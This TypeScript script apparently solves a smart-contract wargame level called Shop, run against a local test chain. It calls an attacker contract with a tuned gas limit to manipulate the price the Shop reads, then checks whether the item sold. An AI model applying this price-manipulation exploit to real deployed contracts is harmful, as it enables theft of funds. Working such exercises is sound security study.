import { ethers } from "ethers";
import { abi as level21Abi } from "../../out/Level21.sol/Level21.json";
import { abi as shopAbi } from "../../out/Shop.sol/Shop.json";

async function main() {
  const provider = new ethers.providers.JsonRpcProvider(
    "http://localhost:8545"
  );

  const result = await provider.send("eth_sendUnsignedTransaction", [
    {
      from: "0xf39fd6e51aad88f6f4ce6ab8827279cfffb92266",
      to: "0xe7f1725E7734CE288F8367e1Bb143E90bb3F0512",
      data: "0xdffeadd0",
      // Experiment with this gas number to change the return
      // value of `price()` in `Level21.sol`
      gas: ethers.BigNumber.from(150000).toHexString(),
    },
  ]);

  const shop = new ethers.Contract(
    "0x5fbdb2315678afecb367f032d93f642f64180aa3",
    shopAbi,
    provider
  );
  const level21 = new ethers.Contract(
    "0xe7f1725e7734ce288f8367e1bb143e90bb3f0512",
    level21Abi,
    provider
  );

  console.log(await shop.functions.isSold());
  console.log(await shop.functions.price());
}

main();
